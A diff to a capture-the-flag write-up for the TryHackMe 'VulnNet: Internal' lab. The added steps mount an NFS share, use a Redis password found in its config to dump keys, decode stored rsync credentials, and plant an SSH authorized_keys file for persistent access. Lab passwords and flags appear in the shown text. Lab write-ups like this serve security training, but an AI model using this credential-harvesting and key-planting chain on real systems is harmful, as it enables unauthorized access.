@@ -194,8 +194,20 @@ Export list for vulnet-internal:
 :~/VulnNetInternal# 
 ```
 
-<p>Explored <code>nfs_acl</code>: port 2049<br>
+<p>Explored <code>nfs_acl (NFS share)</code>: port 2049<br>
 Discovered <code>redis.conf</code></p>
+
+```bash
+:~/VulnNetInternal# mkdir tmp/
+:~/VulnNetInternal# sudo mount -t nfs 10.10.243.254: tmp
+```
+
+<br>
+
+![image](https://github.com/user-attachments/assets/16f409a4-c98a-4351-9b04-cbb6396c7759)
+
+<br>
+<p>Discovered <code>redis.conf</code>.</p>
 
 ```bash
 :~/VulnNetInternal# sudo mount -t nfs Target_IP: mount
@@ -211,44 +223,105 @@ hp  init  opt  profile.d  redis  vim  wildmidi
 ~/VulnNetInternal/mount/opt/conf/redis# ls
 redis.conf
 :~/VulnNetInternal/mount/opt/conf/redis# 
-
 ```
 
 <p>Explored <code>redis</code>: port 6379.</p>
 
 ```bash
-~/VulnNetInternal/mount/opt/conf/redis# cat redis.conf
+~/VulnNetInternal/mount/opt/conf/redis# cat redis.conf | more
+...
+rename-command FLUSHDB ""
+rename-command FLUSHALL ""
+...
+# IF YOU ARE SURE YOU WANT YOUR INSTANCE TO LISTEN TO ALL THE INTERFACES
+# JUST COMMENT THE FOLLOWING LINE.
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+bind 127.0.0.1 ::1
+...
+protected-mode yes
+...
+port 6379
+...
+tcp-backlog 511
+...
+# Close the connection after a client is idle for N seconds (0 to disable)
+timeout 0
+...
+# TCP keepalive.
+...
+tcp-keepalive 300
+...
+# If a pid file is specified, Redis writes it where specified at startup
+# and removes it at exit.
+...
+pidfile /var/run/redis/redis-server.pid
+...
+loglevel notice
+...
+# Set the number of databases. The default database is DB 0, you can select
+# a different one on a per-connection basis using SELECT <dbid> where
+# dbid is a number between 0 and 'databases'-1
+databases 16
+...
+always-show-logo yes
+....
+#   save ""
+
+save 900 1
+save 300 10
+save 60 10000
+
+...
+stop-writes-on-bgsave-error yes
+...
+rdbcompression yes
+...
+rdbchecksum yes
+
+# The filename where to dump the DB
+dbfilename dump.rdb
+...
+# Note that you must specify a directory here, not a file name.
+dir /var/lib/redis
 ...
 slave-serve-stale-data yes
 
 requirepass "B65Hx562F@ggAZ@F"
+...
+slave-read-only yes
+...
+lazyfree-lazy-eviction no
+lazyfree-lazy-expire no
+lazyfree-lazy-server-del no
+slave-lazy-flush no
+...
+# Please check http://redis.io/topics/persistence for more information.
+
+appendonly no
+
+# The name of the append only file (default: "appendonly.aof")
+
+appendfilename "appendonly.aof"
 ...
 ```
 
 <p>- Discovered a password.</p>
 
 ```bash
-:~/VulnNetInternal# nc -vn Target_IP 6379
-Connection to Target_IP 6379 port [tcp/*] succeeded!
-info
--NOAUTH Authentication required.
-AUTH B65Hx562F@ggAZ@F
-+OK
-keys *
-*5
-$3
-int
-$8
-authlist
-$10
-marketlist
-$3
-tmp
-$13
-internal flag
-get "internal flag"
-$37
-THM{ff8e518addbbddb74531a724236a8221}
+:~/VulnNetInternal# sudo apt-get install redis-tools
+...
+:~/VulnNetInternal# redis-cli -h Target_IP -a 'B65Hx562F@ggAZ@F'
+Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
+Target_IP:6379> KEYS *
+1) "marketlist"
+2) "int"
+3) "internal flag"
+4) "tmp"
+5) "authlist"
+Target_IP:6379> KEYS "internal flag"
+1) "internal flag"
+Target_IP:6379> GET "internal flag"
+"THM{ff8e518addbbddb74531a724236a8221}"
 ```
 
 <br>
@@ -260,14 +333,11 @@ THM{ff8e518addbbddb74531a724236a8221}
 <code>LRANGE</code> command returns the specified elements of the list stores at the key. The offsets start and stop are zero-based indexes, with 0 being the first element of the list (the head of the list), 1 being the next element, and so on.  These offsets can also be negative numbers indicating offsets starting at the end of the list. For example, -1 is the last element of the list, -2 the penultimate, and so on.</p>
 
 ```bash
-LRANGE authlist 1 5
-*3
-$112
-QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==
-$112
-QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==
-$112
-QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==
+Target_IP:6379> LRANGE authlist 1 100
+1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
+2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
+3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
+Target_IP:6379> 
 ```
 
 <p>Decode it, and discovered location, and credentials.</p>
@@ -276,13 +346,50 @@ QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3
 ~/VulnNetInternal# echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
 Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
 :~/VulnNetInternal# 
-
 ```
 
 <p>Explored <code>resync</code>: port 873.</p>
 
 ```bash
-~/VulnNetInternal# rsync -av rsync://rsync-connect@Target_IP:873/files ./files
+~/VulnNetInternal# rsync --list-only rsync://rsync-connect@Target_I`P:873/files
+Password: 
+drwxr-xr-x          4,096 2021/02/01 12:51:14 .
+drwxr-xr-x          4,096 2021/02/06 12:49:29 sys-internal
+~/VulnNetInternal# rsync --list-only rsync://rsync-connect@Target_IP:873/files/sys-internal/
+Password: 
+drwxr-xr-x          4,096 2021/02/06 12:49:29 .
+-rw-------             61 2021/02/06 12:49:28 .Xauthority
+lrwxrwxrwx              9 2021/02/01 13:33:19 .bash_history
+-rw-r--r--            220 2021/02/01 12:51:14 .bash_logout
+-rw-r--r--          3,771 2021/02/01 12:51:14 .bashrc
+-rw-r--r--             26 2021/02/01 12:53:18 .dmrc
+-rw-r--r--            807 2021/02/01 12:51:14 .profile
+lrwxrwxrwx              9 2021/02/02 14:12:29 .rediscli_history
+-rw-r--r--              0 2021/02/01 12:54:03 .sudo_as_admin_successful
+-rw-r--r--             14 2018/02/12 19:09:01 .xscreensaver
+-rw-------          2,546 2021/02/06 12:49:35 .xsession-errors
+-rw-------          2,546 2021/02/06 11:40:13 .xsession-errors.old
+-rw-------             38 2021/02/06 11:54:25 user.txt
+drwxrwxr-x          4,096 2021/02/02 09:23:00 .cache
+drwxrwxr-x          4,096 2021/02/01 12:53:57 .config
+drwx------          4,096 2021/02/01 12:53:19 .dbus
+drwx------          4,096 2021/02/01 12:53:18 .gnupg
+drwxrwxr-x          4,096 2021/02/01 12:53:22 .local
+drwx------          4,096 2021/02/01 13:37:15 .mozilla
+drwxrwxr-x          4,096 2021/02/06 11:43:14 .ssh
+drwx------          4,096 2021/02/02 11:16:16 .thumbnails
+drwx------          4,096 2021/02/01 12:53:21 Desktop
+drwxr-xr-x          4,096 2021/02/01 12:53:22 Documents
+drwxr-xr-x          4,096 2021/02/01 13:46:46 Downloads
+drwxr-xr-x          4,096 2021/02/01 12:53:22 Music
+drwxr-xr-x          4,096 2021/02/01 12:53:22 Pictures
+drwxr-xr-x          4,096 2021/02/01 12:53:22 Public
+drwxr-xr-x          4,096 2021/02/01 12:53:22 Templates
+drwxr-xr-x          4,096 2021/02/01 12:53:22 Videos
+~/VulnNetInternal#
+~/VulnNetInternal# rsync authorized_keys rsync://rsync-connect@Target_IP/files/sys-internal/.ssh/
+Password: 
+drwxrwxr-x          4,096 2021/02/06 11:43:14 .
 ...
 ~/VulnNetInternal# ls
 files
@@ -300,7 +407,7 @@ THM{da7c20696831f253e0afaca8b83c07ab}
 <br>
 
 > 1.4. <em>What is the root flag? (root.txt)</em><br><a id='1.4'></a>
->> <code><strong>___</strong></code>
+>> <code><strong>____________________________________</strong></code>
 
 <p>Discovered that we have read, write, and execute permission in <code>sys-internal/.ssh</code></p>
 
@@ -339,5 +446,58 @@ drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Videos
 -rw-------  1 ubuntu ubuntu 2546 Feb  6  2021 .xsession-errors.old
 :~/VulnNetInternal/files/sys-internal# 
 ```
+
+
+<p>Generated <code>VulnNetInternalRSA</code> and <code>VulnNetInternalRSA.pub</code>.</p>
+
+```bash
+:~/VulnNetInternal/files/sys-internal/.ssh# ssh-keygen -f VulnNetInternalRSA
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in VulnNetInternalRSA
+Your public key has been saved in VulnNetInternalRSA.pub
+The key fingerprint is:
+SHA256:[ Redacted ] [ Redacted ]
+The key's randomart image is:
++---[RSA 3072]----+
+|          . ...==|
+|         . +..=.*|
+|          * ...+=|
+|         + = ..o+|
+|        S = . ..E|
+|       o O    ..*|
+|        * .  o +B|
+|       . o  . +.*|
+|             .o*o|
++----[SHA256]-----+
+```
+
+<p>Created <code>authorized_keys</code>.</p>
+
+```bash
+:~/VulnNetInternal/files/sys-internal/.ssh# touch authorized_keys
+```
+
+<p>Stored <code>VulnNetInternalRSA.pub</code> in <code>authorized_keys</code>.</p>
+
+```bash
+:~/VulnNetInternal/files/sys-internal/.ssh# cat VulnNetInternalRSA.pub > authorized_keys
+```
+
+<p>Provided user read, write, and execute permissions.</p> 
+
+```bash
+:~/VulnNetInternal/files/sys-internal/.ssh# chmod 700 authorized_keys
+```
+
+<p>Used <code>rsync</code> again.</p>
+
+```bash
+~/VulnNetInternal/files/sys-internal# rsync -av ~/VulnNetInternal/files/sys-internal/.ssh/authorized_keys rsync://rsync-connect@10.10.243.254:873/files/sys-internal/.ssh
+```
+
+
+<h2> To be continued ...</h2>
 
 
